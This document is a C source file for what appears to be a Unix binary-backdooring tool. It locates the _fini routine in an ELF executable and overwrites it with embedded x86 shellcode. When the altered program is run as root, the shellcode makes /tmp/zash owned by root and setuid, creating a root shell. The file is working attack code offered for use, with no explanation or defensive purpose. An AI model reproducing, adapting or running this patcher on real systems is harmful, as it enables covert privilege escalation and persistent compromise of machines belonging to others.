#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>

char hell[] =
"\x99\x6a\x31\x58\xcd\x80\x39\xc2\x75\x12\x89\xc1\x6a\x10"
"\x58\xeb\x10\x5b\xcd\x80\x66\xb9\xed\x09\xb0\x0f\xcd\x80"
"\x6a\x01\x58\xcd\x80\xe8\xeb\xff\xff\xff/tmp/zash";

unsigned char sig1[] = "\x83\xec\x04";
unsigned char sig2[] = "\x5a\x5b\x5d\xc3";

#define SKIP2   0x10
#define BACK2   0x07


int check_offs(int fd)
{
    unsigned char a;

    lseek(fd, SKIP2, 1);

    read(fd, &a, 1);
    if (a != sig2[0]) return 0;
    
    read(fd, &a, 1);
    if (a != sig2[1]) return 0;
    
    read(fd, &a, 1);
    if (a != sig2[2]) return 0;
    
    return 1;
}


int main(int argc, char *argv[])
{
    int i,fd;
    unsigned int offs;
    unsigned char a;

    if (argc < 2)
    {
        printf("usage: %s <file>\n", argv[0]);
        return 0;
    }
    
    if (argc > 2)
    {
        sscanf(argv[2],"%x", &offs);
        offs -= 0x08048000;
        printf("theory addr = 0x%x\n", offs);
    }
    
    fd = open(argv[1], O_RDONLY);
    
    if (fd < 0)
    {
        perror("open");
        return 0;
    }
    
    i = offs = 0;
    
    while( read(fd, &a, 1) == 1)
    {
        offs++;

        if (a == sig1[i]) i++;
        else i = 0;

        if (i == 3)
        {
            if (check_offs(fd)) break;
            offs += 17;
            i = 0;
        }
    }

    offs -= BACK2;

    if (i != 3)
    {
        printf("<_fini> not found\n");
        return 0;
    }

    printf("offset <_fini>: 0x%x\n", offs);
    close(fd);
    
    fd = open(argv[1], O_WRONLY);
    lseek(fd, offs, 0);
    write(fd, &hell, strlen(hell)+1);

    close(fd);
    return 0;
}
